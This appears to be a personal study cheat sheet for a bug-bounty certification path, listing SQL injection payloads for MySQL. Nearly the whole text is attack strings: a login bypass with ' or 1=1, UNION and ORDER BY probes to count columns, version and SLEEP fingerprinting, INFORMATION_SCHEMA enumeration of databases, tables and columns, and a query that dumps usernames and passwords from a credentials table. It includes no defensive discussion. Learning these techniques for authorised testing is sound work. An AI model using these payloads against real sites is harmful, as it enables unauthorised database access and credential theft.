# CBBH PATH

# SQL Injection
## Find the Vuln Query
```powershell
# Check the url after the ?raman=raman
# Check login fields
```

## Fix the Query
```powershell
-- #for comment
```

## Payloads
```powershell
' or 1=1 --
'--
```

## Detmine the number of columns
```powershell
# Using UNION. The number and the order of the columns must be the same in all queries && The data types must be compatible
cn' UNION select NULL, NULL, NULL-- -
cn' UNION select NULL, NULL, NULL, NULL-- -
UNION select NULL, NULL, NULL, NULL from raman-- -

# Using OrderBy
' order by 1-- -
```

## Finding a column containing text (Data Type)
```powershell
# In case of an error it means the column is not type string
# In case of no error it menas the column is type string
cn' UNION select NULL, 'raman', NULL, NULL-- -
UNION select username, NULL, NULL, 'raman' from raman-- -
```

## DB Enumeration
```powershell
SELECT @@version #Fingerprint MySQL with query output
SELECT SLEEP(5) #Fingerprint MySQL with no output
cn' UNION select 1,database(),2,3-- - #Current database name
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - #List all databases
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - #List all tables in a specific database
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - #List all columns in a specific table
cn' UNION select 1, username, password, 4 from dev.credentials-- - #Dump data from a table in another database
```
